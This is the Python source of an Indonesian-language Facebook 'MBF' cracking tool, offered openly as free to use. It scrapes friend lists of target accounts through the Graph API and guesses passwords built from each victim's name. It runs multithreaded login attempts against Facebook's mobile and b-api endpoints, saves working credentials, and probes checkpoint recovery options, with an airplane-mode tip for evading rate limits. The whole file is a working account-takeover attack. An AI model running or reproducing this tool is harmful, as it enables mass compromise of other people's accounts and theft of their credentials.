# Full Open Source Code
# Coded By @rohman
# https://www.facebook.com/Zidan.Ganzz.56
# https://github.com/Zidanxganzz

#   Release Date : Jum,11 Feb,2022
#   Simple Look, Easy To Understand
#   Easy To Use ✓
#   Free For Use ✓

import requests,bs4,json,os,sys,random,datetime,time

try:
  import rich
except ImportError:
  os.system('pip install rich')
  time.sleep(1)
  try:
    import rich
  except ImportError:
    exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col

# UA LIST
try:ugen = open('user.txt','r').readlines()
except:ugen = ['Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/1A542a Safari/419.3','Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/1A542a Safari/419.3','Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/1A542a Safari/419.3','Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/1A542a Safari/419.3','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']

# INDICATION
id,id2,loop,ok,cp,akun,oprek,method = [],[],0,0,0,[],[],[]

# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

# Converter Bulan
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# CLEAR
def clear():
  os.system('clear')

# BACK
def back():
  login()

# BANNER
def banner():
  clear()
  wel = '# WELCOME TO FACEBOOK MBF TOOLS 2K22'
  wel2 = mark(wel, style='cyan')
  sol().print(wel2, style='on red')
  ise = '# INFORMASI PENGEMBANG'
  fc = mark(ise, style='green')
  sol().print(fc)
  tap = me()
  tap.add_column('Author', style='yellow', justify='center')
  tap.add_column('Github', style='yellow', justify='center')
  tap.add_row('Zidanxganzz','https://github.com/Zidanxganzz')
  sol().print(tap, justify='center')

# VALIDASI TOKEN
def login():
  try:
    token = open('token.txt','r').read()
    try:
      sy = requests.get('https://graph.facebook.com/me?access_token='+token)
      sy2 = json.loads(sy.text)['name']
      sy3 = json.loads(sy.text)['id']
      sy4 = json.loads(sy.text)['birthday']
      menu(sy2,sy3,sy4)
    except KeyError:
      login_lagi()
    except requests.exceptions.ConnectionError:
      banner()
      li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
      lo = mark(li, style='red')
      sol().print(lo, style='cyan')
      exit()
  except IOError:
    login_lagi()

# LOGIN
def login_lagi():
  banner()
  sky = '# LOGIN MENGGUNAKAN AKSES TOKEN'
  sky2 = mark(sky, style='green')
  sol().print(sky2, style='cyan')
  panda = input(x+'['+p+'f'+x+'] Token : ')
  try:
    tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
    tes2 = json.loads(tes.text)['name']
    tes3 = json.loads(tes.text)['id']
    tes4 = json.loads(tes.text)['birthday']
    open('token.txt','w').write(panda)
    sue = '# Login Sukses, Tunggu Sebentar!'
    suu = mark(sue, style='green')
    sol().print(suu, style='cyan')
    time.sleep(2.5)
    menu(tes2,tes3,tes4)
  except KeyError:
    sue = '# Login Gagal, Periksa Token Anda!'
    suu = mark(sue, style='red')
    sol().print(suu, style='cyan')
    time.sleep(2.5)
    login_lagi()
  except requests.exceptions.ConnectionError:
    li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
    lo = mark(li, style='red')
    sol().print(lo, style='cyan')
    exit()

# MENU
def menu(my_name,my_id,my_birthday):
  try:sh = requests.get('https://httpbin.org/ip').json()
  except:sh = {'origin':'-'}
  try:
    tglx = my_birthday.split('/')[1]
    blnx = dic2[str(my_birthday.split('/')[0])]
    thnx = my_birthday.split('/')[2]
    birth = tglx+' '+blnx+' '+thnx
  except:birth = '-'
  banner()
  sg = '# MENU TOOLS'
  fx = mark(sg, style='green')
  sol().print(fx)
  print(x+'['+h+'•'+x+'] Active User : '+str(my_name))
  print(x+'['+h+'•'+x+'] User Id     : '+str(my_id))
  print(x+'['+h+'•'+x+'] User Ttl    : '+str(birth))
  print(x+'['+h+'•'+x+'] Ip Address  : '+str(sh['origin']))
  io = '[01] Crack Dari Pertemanan Publik\n[02] Crack Dari Pertemanan Publik (Massal)\n[03] Cek Result Crack\n[04] Cek Opsi Checkpoint\n[00] Log Out'
  oi = nel(io, style='cyan')
  cetak(nel(oi, title='MENU'))
  jh = input(x+'['+p+'f'+x+'] Pilih : ')
  if jh in ['1','01']:
    dump_publik()
  elif jh in ['2','02']:
    dump_massal()
  elif jh in ['3','03']:
    result()
  elif jh in ['4','04']:
    file()
  elif jh in ['0','00']:
    os.system('rm -rf token.txt')
    print(x+'['+h+'•'+x+'] Wait ...')
    time.sleep(1)
    sw = '# BERHASIL LOG OUT'
    sol().print(mark(sw, style='green'))
    exit()
  else:
    ric = '# PILIHAN TIDAK ADA DI MENU'
    sol().print(mark(ric, style='red'))
    exit()

# RESULT CHECKER
def result():
  cek = '# CEK RESULT CRACK'
  sol().print(mark(cek, style='green'))
  kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'
  kis = nel(kayes, style='cyan')
  cetak(nel(kis, title='RESULTS'))
  kz = input(x+'['+p+'f'+x+'] Pilih : ')
  if kz in ['1','01']:
    try:vin = os.listdir('CP')
    except FileNotFoundError:
      gada = '# DIREKTORI TIDAK DITEMUKAN'
      sol().print(mark(gada, style='red'))
      time.sleep(2)
      back()
    if len(vin)==0:
      haha = '# ANDA BELUM MEMILIKI RESULT CP'
      sol().print(mark(haha, style='yellow'))
      time.sleep(2)
      back()
    else:
      gerr = '# HASIL CP ANDA'
      sol().print(mark(gerr, style='green'))
      cih = 0
      lol = {}
      for isi in vin:
        try:hem = open('CP/'+isi,'r').readlines()
        except:continue
        cih+=1
        if cih<10:
          nom = '0'+str(cih)
          lol.update({str(cih):str(isi)})
          lol.update({nom:str(isi)})
          print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
        else:
          lol.update({str(cih):str(isi)})
          print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
      gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
      sol().print(mark(gerr2, style='green'))
      geeh = input(x+'['+p+'f'+x+'] Pilih : ')
      try:geh = lol[geeh]
      except KeyError:
        ric = '# PILIHAN TIDAK ADA DI MENU'
        sol().print(mark(ric, style='red'))
        exit()
      try:lin = open('CP/'+geh,'r').read()
      except:
        hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
        sol().print(mark(hehe, style='red'))
        time.sleep(2)
        back()
      akun = '# LIST AKUN CP ANDA'
      sol().print(mark(akun, style='green'))
      hus = os.system('cd CP && cat '+geh)
      akun2 = '# LIST AKUN CP ANDA'
      sol().print(mark(akun, style='green'))
      input(x+'['+h+'•'+x+'] Kembali')
      back()
  elif kz in ['2','02']:
    try:vin = os.listdir('OK')
    except FileNotFoundError:
      gada = '# DIREKTORI TIDAK DITEMUKAN'
      sol().print(mark(gada, style='red'))
      time.sleep(2)
      back()
    if len(vin)==0:
      haha = '# ANDA BELUM MEMILIKI RESULT OK'
      sol().print(mark(haha, style='yellow'))
      time.sleep(2)
      back()
    else:
      gerr = '# HASIL OK ANDA'
      sol().print(mark(gerr, style='green'))
      cih = 0
      lol = {}
      for isi in vin:
        try:hem = open('OK/'+isi,'r').readlines()
        except:continue
        cih+=1
        if cih<10:
          nom = '0'+str(cih)
          lol.update({str(cih):str(isi)})
          lol.update({nom:str(isi)})
          print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
        else:
          lol.update({str(cih):str(isi)})
          print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
      gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
      sol().print(mark(gerr2, style='green'))
      geeh = input(x+'['+p+'f'+x+'] Pilih : ')
      try:geh = lol[geeh]
      except KeyError:
        ric = '# PILIHAN TIDAK ADA DI MENU'
        sol().print(mark(ric, style='red'))
        exit()
      try:lin = open('OK/'+geh,'r').read()
      except:
        hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
        sol().print(mark(hehe, style='red'))
        time.sleep(2)
        back()
      akun = '# LIST AKUN OK ANDA'
      sol().print(mark(akun, style='green'))
      hus = os.system('cd OK && cat '+geh)
      akun2 = '# LIST AKUN OK ANDA'
      sol().print(mark(akun, style='green'))
      input(x+'['+h+'•'+x+'] Kembali')
      back()
  elif kz in ['0','00']:
    back()
  else:
    ric = '# PILIHAN TIDAK ADA DI MENU'
    sol().print(mark(ric, style='red'))
    exit()

# OPEN
def file():
  tek = '# CEK OPSI DARI FILE'
  sol().print(mark(tek, style='cyan'), style='on red')
  print(x+'['+h+'•'+x+'] Sedang Membaca File, Tunggu Sebentar ...')
  time.sleep(2)
  teks = '# PILIH FILE YG AKAN DI CEK'
  sol().print(mark(teks, style='green'))
  my_files = []
  try:
    lis = os.listdir('CP')
    for kt in lis:
      my_files.append(kt)
  except:pass
  try:
    mer = os.listdir('OK')
    for ty in mer:
      my_files.append(ty)
  except:pass
  if len(my_files)==0:
    yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
    sol().print(mark(yy, style='red'))
    exit()
  else:
    cih = 0
    lol = {}
    for isi in my_files:
      try:hem = open('CP/'+isi,'r').readlines()
      except:
        try:hem = open('OK/'+isi,'r').readlines()
        except:continue
      cih+=1
      if cih<10:
        nom = '0'+str(cih)
        lol.update({str(cih):str(isi)})
        lol.update({nom:str(isi)})
        print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
      else:
        lol.update({str(cih):str(isi)})
        print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
    teks2 = '# PILIH FILE YG AKAN DI CEK'
    sol().print(mark(teks2, style='green'))
    geeh = input(x+'['+p+'f'+x+'] Pilih : ')
    try:geh = lol[geeh]
    except KeyError:
      ric = '# PILIHAN TIDAK ADA DI MENU'
      sol().print(mark(ric, style='red'))
      exit()
    try:
      hf = open('CP/'+geh,'r').readlines()
      for fz in hf:
        akun.append(fz.replace('\n',''))
      cek_opsi()
    except IOError:
      try:
        hf = open('OK/'+geh,'r').readlines()
        for fz in hf:
          akun.append(fz.replace('\n',''))
        cek_opsi()
      except IOError:
        hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
        sol().print(mark(hehe, style='red'))
        time.sleep(2)
        back()

# DUMP ID PUBLIK
def dump_publik():
  try:
    token = open('token.txt','r').read()
  except IOError:
    exit()
  win = '# DUMP ID PUBLIK'
  win2 = mark(win, style='green')
  sol().print(win2)
  print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
  pil = input(x+'['+p+'f'+x+'] Masukkan ID Target : ')
  try:
    koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
    grex = json.loads(koh.text)['name']
    kras = '# INFO TARGET'
    kras2 = mark(kras, style='green')
    sol().print(kras2)
    print(x+'['+h+'•'+x+'] Nama  : '+str(grex))
  except (KeyError,IOError):
    teks = '# ID Tidak Ditemukan'
    teks2 = mark(teks, style='red')
    sol().print(teks2)
    time.sleep(2)
    exit()
  except requests.exceptions.ConnectionError:
    li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
    lo = mark(li, style='red')
    sol().print(lo, style='cyan')
    exit()
  try:
    koh2 = requests.get('https://graph.facebook.com/'+pil+'/friends?limit=5000&access_token='+token)
    koh3 = json.loads(koh2.text)
    for pi in koh3['data']:
      try:id.append(pi['id']+'|'+pi['name'])
      except:continue
    print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
    setting()
  except requests.exceptions.ConnectionError:
    li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
    lo = mark(li, style='red')
    sol().print(lo, style='cyan')
    exit()
  except (KeyError,IOError):
    teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
    teks2 = mark(teks, style='red')
    sol().print(teks2)
    exit()

# DUMP ID MASSAL
def dump_massal():
  try:
    token = open('token.txt','r').read()
  except IOError:
    exit()
  win = '# DUMP ID PUBLIK MASSAL'
  win2 = mark(win, style='green')
  sol().print(win2)
  print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
  try:
    jum = int(input(x+'['+p+'f'+x+'] BERAPA ID : '))
  except ValueError:
    pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
    pesan2 = mark(pesan, style='red')
    sol().print(pesan2)
    exit()
  if jum<1 or jum>10:
    pesan = '# OUT OF RANGE MEN'
    pesan2 = mark(pesan, style='red')
    sol().print(pesan2)
    exit()
  uid = []
  yz = 0
  print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
  for met in range(jum):
    yz+=1
    kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
    uid.append(kl)
  for userr in uid:
    try:
      col = requests.get('https://graph.facebook.com/'+userr+'/friends?limit=5000&access_token='+token)
      col2 = json.loads(col.text)
      for mi in col2['data']:
        try:
          iso = mi['id']+'|'+mi['name']
          if iso in id:pass
          else:id.append(iso)
        except:continue
    except (KeyError,IOError):
      pass
    except requests.exceptions.ConnectionError:
      li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
      lo = mark(li, style='red')
      sol().print(lo, style='cyan')
      exit()
  tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
  if len(id)==0:
    tot2 = mark(tot, style='red')
  else:
    tot2 = mark(tot, style='green')
  sol().print(tot2)
  setting()

# PENGATURAN ID
def setting():
  wl = '# SETTING URUTAN ID'
  sol().print(mark(wl, style='green'))
  teks = '[01] Crack Dari Akun Tertua (Not Recommended)\n[02] Crack Dari Akun Termuda (Recommended)\n[03] Acak Urutan ID (Highly Recommended)'
  tak = nel(teks, style='cyan')
  cetak(nel(tak, title='SETTING'))
  hu = input(x+'['+p+'f'+x+'] Pilih : ')
  if hu in ['1','01']:
    for bacot in id:
      id2.append(bacot)
  elif hu in ['2','02']:
    for bacot in id:
      id2.insert(0,bacot)
  elif hu in ['3','03']:
    for bacot in id:
      xx = random.randint(0,len(id2))
      id2.insert(xx,bacot)
  else:
    ric = '# PILIHAN TIDAK ADA DI MENU'
    sol().print(mark(ric, style='red'))
    exit()
  met = '# PILIH METHOD CRACK'
  sol().print(mark(met, style='green'))
  ioz = '[01] Method B-Api (Fast)\n[02] Method Mobile (Slow)'
  gess = nel(ioz, style='cyan')
  cetak(nel(gess, title='METHOD'))
  hc = input(x+'['+p+'f'+x+'] Pilih : ')
  if hc in ['1','01']:
    method.append('api')
  else:
    method.append('mobile')
  guw = '# INGIN OPSI CRACK?'
  sol().print(mark(guw, style='green'))
  osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
  if osk in ['y','Y']:
    oprek.append('ya')
  else:
    oprek.append('no')
  passwrd()

# WORDLIST
def passwrd():
  ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
  sol().print(mark(ler, style='green'))
  krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
  cetak(nel(krek, title='CRACK'))
  with tred(max_workers=30) as pool:
    for yuzong in id2:
      idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
      frs = nmf.split(' ')[0]
      pwv = []
      if len(nmf)<6:
        if len(frs)<3:
          pass
        else:
          pwv.append(frs+'123')
          pwv.append(frs+'12345')
      else:
        if len(frs)<3:
          pwv.append(nmf)
        else:
          pwv.append(nmf)
          pwv.append(frs+'123')
          pwv.append(frs+'12345')
      pwv.append('sayang')
      if 'mobile' in method:
        pool.submit(crack,idf,pwv)
      elif 'api' in method:
        pool.submit(crack2,idf,pwv)
      else:
        pool.submit(crack,idf,pwv)
  print('')
  tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
  sol().print(mark(tanya, style='green'))
  woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
  if woi in ['y','Y']:
    cek_opsi()
  else:
    exit()

# CRACKER
def crack(idf,pwv):
  global loop,ok,cp
  bi = random.choice([u,k,kk,b,h,hh])
  pers = loop*100/len(id2)
  fff = '%'
  print('\r%s---> %s/%s ---> ok*%s ---> cp*%s ---> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
  ua = random.choice(ugen).replace('\n','')
  ses = requests.Session()
  for pw in pwv:
    try:
      tix = time.time()
      head = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
      dt = {'email': idf,'pass': '#PWD_BROWSER:0:{}:{}'.format(int(tix),pw),'login': 'submit'}
      z = ses.get('https://m.facebook.com')
      j = ses.post('https://m.facebook.com/login.php', data=dt, headers=head, allow_redirects=True)
      if "checkpoint" in ses.cookies.get_dict().keys():
        if 'ya' in oprek:
          akun.append(idf+'|'+pw)
          ceker(idf,pw)
        else:
          print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
          open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
        open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
        ok+=1
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(31)
  loop+=1

# CRACKER2
def crack2(idf,pwv):
  global loop,ok,cp
  bi = random.choice([u,k,kk,b,h,hh])
  pers = loop*100/len(id2)
  fff = '%'
  print('\r%s---> %s/%s ---> ok*%s ---> cp*%s ---> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
  ua = random.choice(ugen).replace('\n','')
  ses = requests.Session()
  for pw in pwv:
    try:
      head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
      resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
      if "www.facebook.com" in resp.json()["error_msg"]:
        if 'ya' in oprek:
          akun.append(idf+'|'+pw)
          ceker(idf,pw)
        else:
          print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
          open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          cp+=1
        break
      elif "session_key" in resp.text and "EAAA" in resp.text:
        print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
        open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
        ok+=1
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(31)
  loop+=1

# OPSI
def ceker(idf,pw):
  global cp
  ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
  head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
  ses = requests.Session()
  try:
    hi = ses.get('https://mbasic.facebook.com')
    ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
    jo = ho.find('form')
    data = {}
    lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
    for anj in jo('input'):
      if anj.get('name') in lion:
        data.update({anj.get('name'):anj.get('value')})
    kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
    print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
    cp+=1
    opsi = kent.find_all('option')
    if len(opsi)==0:
      print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
    else:
      for opsii in opsi:
        print('\r%s---> %s%s'%(kk,opsii.text,x))
  except Exception as c:
    print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
    print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
    cp+=1

# OPSI CEKER
def cek_opsi():
  c = len(akun)
  hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
  cetak(nel(hu, title='CEK OPSI'))
  input(x+'['+h+'•'+x+'] Mulai')
  cek = '# PROSES CEK OPSI DIMULAI'
  sol().print(mark(cek, style='green'))
  love = 0
  for kes in akun:
    try:
      try:
        id,pw = kes.split('|')[0],kes.split('|')[1]
      except IndexError:
        time.sleep(2)
        print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
        print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
        continue
      bi = random.choice([u,k,kk,b,h,hh])
      print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
      ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
      ses = requests.Session()
      header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
      hi = ses.get('https://mbasic.facebook.com')
      ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
      if "checkpoint" in ses.cookies.get_dict().keys():
        try:
          jo = ho.find('form')
          data = {}
          lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
          for anj in jo('input'):
            if anj.get('name') in lion:
              data.update({anj.get('name'):anj.get('value')})
          kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
          print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
          opsi = kent.find_all('option')
          if len(opsi)==0:
            print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
          else:
            for opsii in opsi:
              print('\r%s---> %s%s'%(kk,opsii.text,x))
        except:
          print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
          print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
      elif "c_user" in ses.cookies.get_dict().keys():
        print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
      else:
        print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
      love+=1
    except requests.exceptions.ConnectionError:
      print('')
      li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
      sol().print(mark(li, style='red'))
      exit()
  dah = '# DONE'
  sol().print(mark(dah, style='green'))
  exit()

if __name__=='__main__':
  try:os.mkdir('CP')
  except:pass
  try:os.mkdir('OK')
  except:pass
  os.system('git pull')
  login()